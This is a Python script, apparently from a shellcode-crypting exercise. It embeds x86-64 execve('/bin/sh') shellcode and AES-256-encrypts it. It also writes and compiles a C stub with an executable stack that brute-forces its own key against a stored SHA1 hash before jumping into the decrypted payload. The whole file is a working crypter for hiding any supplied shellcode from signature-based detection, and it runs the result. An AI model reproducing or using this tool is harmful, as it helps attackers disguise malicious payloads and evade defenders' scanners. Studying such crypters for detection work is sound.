#!/usr/bin/env python

import sys
import os
import subprocess
import random
import re

#shellcode = bytearray(sys.stdin.read())

shellcode = "\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43"


pad = lambda s: s + (Base_Size - len(s) % Base_Size) * chr(Base_Size - len(s) % Base_Size)                       # padding important (PKS5) , for AES is mandatory size of shellcode is a multiple of 16 , you can use this function
unpad = lambda s : s[0:-ord(s[-1])]                                                  # to pad the shellcode or pad with nops (\x90)
Base_Size = 16



def Convert_Pass_To_Int_String(data):                                                       # Convert char user imput to integer (returned as string)
        integer = ''
        for p in data:
           i = ord(p)
           integer += str(i)
        return integer

def Print_To_Hex(data):                                                              # Convert to a hex format ex ("\x11\x22\x33")
	_hex = ""
        for x in bytearray(data):
                _hex += '\\x'
                _hex += "{:02x}".format(x)
	return _hex


header = "#include<stdio.h>\n"
header += "#include<stdlib.h>\n"
header += "#include<string.h>\n"                                                    # reused header
header += "#include \"polarssl/include/aes.h\"\n"
header += "#include \"polarssl/include/sha256.h\"\n\n"
header += "#include \"polarssl/include/sha1.h\"\n\n"

def Create_File_For_Sha(password , output_len):                                                                          #Create a C file to convert hash password in SHA


	main = "int main()\n{\n"
        main += "const unsigned char password[] = \"{0}\" ;\n\n".format(password)
        main += "size_t pass_len = {0} ;\n\nunsigned char key[20];\n\n".format(len(password))
        main += "int i = 0;\n\n"

      	main_sha = " sha1_context sha_ctx;\nsha1_starts(&sha_ctx);\nsha1_update(&sha_ctx, password, pass_len);\nsha1_finish(&sha_ctx, key);\n"

        main_print = "\nfor(i = 0 ; i < 20 ; i++){{\nprintf(\"\\\\x%x\" , key[i] );}};\n".format(output_len)

        main_end = "return 0;\n}"

	_file = open("temp_sha.c" , "w")
        _file.write(header)
        _file.write(main)
        _file.write(main_sha)
        _file.write(main_print)
        _file.write(main_end)
        _file.close()
        os.system("gcc temp_sha.c polarssl/library/libpolarssl.a -o temp_sha")

def Grab_Sha_Output():
        Sha = subprocess.check_output("./temp_sha")                                                                                      #Execute the file and grab the output , also printed on screen
        print("Sha key :\n\n\"{0}\" \n".format(Sha))
        return Sha



def Create_File_For_AES256_Key_Generator(password ,  input_len , output_len):                                                                                #Create a C file to convert password in Md5 hash



	main = "int main()\n{\n"
        main += "unsigned char password[] = \"{0}\" ;\n\n".format(password)
        main += "size_t pass_len = {0} ;\n\nunsigned char key[32];\n\n".format(len(password))
        main += "size_t input_len = {0};\n\n".format(input_len)
        main += "int i = 0;\n\n"

        main_sha256 = "sha256_context sha256_ctx;\nsha256_starts(&sha256_ctx, 0);\nsha256_update(&sha256_ctx, password, pass_len);\nsha256_finish(&sha256_ctx, key);\n"

	main_print = "\nfor(i = 0 ; i < 32 ; i++){{\nprintf(\"\\\\x%x\" , key[i] );}};\n".format(output_len)

	main_end = "return 0;\n}"

	_file = open("temp_aeskeygenerator.c" , "w")
        _file.write(header)
	_file.write(main)
        _file.write(main_sha256)
        _file.write(main_print)
        _file.write(main_end)
        _file.close()
        os.system("gcc temp_aeskeygenerator.c   polarssl/library/libpolarssl.a -o temp-aeskeygenerator")


def Grab_AESKey_Output():                                                                                                                  #Execute the file and grab the output , also printed on screen
        AES_Key = subprocess.check_output("./temp-aeskeygenerator")
        print("Generated AES_Key :\n\n\"{0}\" \n".format(AES_Key))
  	return AES_Key





def Create_File_For_Encode_Shellcode(shellcode ,password ,AES_Key, IV , input_len , output_len , header):                                    #Create the file to encrypt the shellcode


	main = "int main()\n{{\nconst unsigned char input[] = \\\n \"{0}\"; \n\n".format(Print_To_Hex(shellcode))
	main += "unsigned char password[] = \"{0}\" ;\n\n".format(password)
	main += "size_t pass_len = {0} ;\n\nunsigned char key[] = \"{1}\";\n\nunsigned char iv [16]= \"{2}\";\n\n".format(len(password), AES_Key , IV)
	main += "unsigned char output[{0}];\n\n".format(output_len)
	main += "size_t input_len = {0};\n\n".format(input_len)
	main += "int i = 0;\n\n"


	main_aes = "\naes_context aes;\naes_setkey_enc(&aes, key, 256);\naes_crypt_cbc(&aes, 1 , input_len , iv, input , output);\n"

	main_print = "\nfor(i = 0 ; i < {0} ; i++){{\nprintf(\"\\\\x%02x\" , output[i]);}};\n".format(output_len)


	main_end = "return 0;\n}"
	_file = open("temp-encrypter.c" , "w")
	_file.write(header)
	_file.write(main)
       	_file.write(main_aes)
	_file.write(main_print)
	_file.write(main_end)
	_file.close()
	os.system("gcc temp-encrypter.c  polarssl/library/libpolarssl.a -o temp-encrypter")




def grab_output():                                                                                                                        #Grab the encrypted shellcode
        encrypted_shellcode = subprocess.check_output("./temp-encrypter")
        print("Encrypted_shellcode:\n")
        for byte in re.findall(".?"*64, encrypted_shellcode):                                                                             #thanks in "blackhat library" for this simple format function
             if byte != "":
                    print("\"" + byte + "\"")
        return encrypted_shellcode


def Create_File_For_Binary(encrypted_shellcode , Sha , password , IV , input_len , output_len, header):                                   #Create the final binary with the decryption and bruteforce routine

	time = "#include<time.h>\n"

	main = "int main()\n{{\nconst unsigned char input[] = \\\n\"{0}\"; \n\n".format(encrypted_shellcode)
	main += "unsigned char password[{0}] ;\n\n".format(len(password) )
	main += "size_t pass_len = {0};\n\nunsigned char key[32] ;\n\nunsigned char iv []= \"{1}\";\n\n".format(len(password), IV)
	main += "\nunsigned char key2[] = \"{0}\";\n".format(Sha)
	main += "\nunsigned char sha_key[21];\n"
	main += "unsigned char output[{0}];\n\n".format(output_len)
	main += "size_t input_len = {0} ;\n\n".format(input_len)
	main += "int i;\n"
	main += "\nsrand ( time(NULL) )\n;"

        main_loop = "\nwhile(strncmp(sha_key,key2,20)!=0){\n"
	main_loop += "\ni = rand() % {} ;\n".format(int(password) + random.randint(1,len(password)))
        main_loop += "\n\n sprintf(password , \"%d\" , i);\n\n"

        main_loop_sha = "\nsha1_context sha_ctx;\nsha1_starts(&sha_ctx);\nsha1_update(&sha_ctx, password, pass_len);\nsha1_finish(&sha_ctx, sha_key)\n;}\n\n"

        main_sha256 = "sha256_context sha256_ctx;\nsha256_starts(&sha256_ctx, 0);\nsha256_update(&sha256_ctx, password, pass_len);\nsha256_finish(&sha256_ctx, key);\n"
        main_aes = "\nprintf(\"BruteForced\\n\");\naes_context aes;\naes_setkey_dec(&aes, key, 256);\naes_crypt_cbc(&aes, 0 , input_len , iv, input , output);\n"

        main_end =  "\n\n((void (*)()) output)()\n\n;return 0;}"

	_file = open("temp-final.c" , "w")
        _file.write(header)
	_file.write(time)
        _file.write(main)
        _file.write(main_loop)
        _file.write(main_loop_sha)
        _file.write(main_sha256)
        _file.write(main_aes)
	_file.write(main_end)
	_file.close()

	os.system("gcc temp-final.c -z execstack polarssl/library/libpolarssl.a -o shellcode")
        os.system("rm temp*")
	os.system("strip --strip-all shellcode")



def Create_Shellcode():
        password = sys.argv[1]
        password = Convert_Pass_To_Int_String(password)

        input_len = output_len = len(pad(shellcode))

	IV = os.urandom(Base_Size)

	IV = Print_To_Hex(IV)

        print("\nIV Value :\n\n\"{0}\"\n".format(IV))

	Create_File_For_Sha(password , output_len)
        Sha = Grab_Sha_Output()

        Create_File_For_AES256_Key_Generator(password ,  input_len , output_len)
        AES_Key = Grab_AESKey_Output()

	Create_File_For_Encode_Shellcode(shellcode ,password , AES_Key ,IV , input_len , output_len ,  header)
        encrypted_shellcode = grab_output()

	Create_File_For_Binary(encrypted_shellcode, Sha ,password,  IV , input_len , output_len , header)

	print("\nBinary created , file ./shellcode \n")


if __name__ == "__main__":
         try:
              sys.argv[1] != 0
         except:
              print(""" ERROR !!! default - usage ./_AESencoder_BruteForce.py  password (execve shellcode),
                      or echo -ne \"shellcode\" | ./_AESencoder_BruteForce.py password
                      (warning 1-4  caracters recommended ) over can make long time to bruteforce\")""")

              exit(-1)
         Create_Shellcode()

